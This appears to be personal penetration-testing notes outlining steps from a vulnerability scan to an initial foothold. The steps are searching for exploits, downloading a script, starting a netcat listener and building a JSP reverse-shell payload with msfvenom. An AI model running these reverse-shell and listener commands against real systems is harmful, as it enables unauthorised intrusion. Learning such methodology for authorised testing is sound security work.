After running the vulners script OR autorecon, we should find some vulnerable ports running vulnerable services. If it is a website port refer to the web foothold.

1. We can use searchsploit AND a google search for potential exploit packages.

-- searchsploit arcticmage 8.0.2

-- Google search 'arcticmage 8.0.2 exploit'

2. Next, we will either download the script from the internet OR use a script internally downloaded to kali.

--

-- To download the googled script we will need to 'sudo wget <githubexploit.py>

3. Next, we will prepare to exploit. In this step we will do things like craft payloads, and set up listeners.

For most scripts we will need to first start by setting up a listener on our machine, this command commonly looks like

nc -nlvp 4343

-- For .jsp files we will use the following script to create the payload 'sudo msfvenom -p java/jsp_shell_reverse_tcp lhost=<my ip> port=4343 -f raw > payload.jsp

4. We will execute the exploit.

-- python2 exploit.py == cat the exploit to learn the exact usage of the exploit. // python2
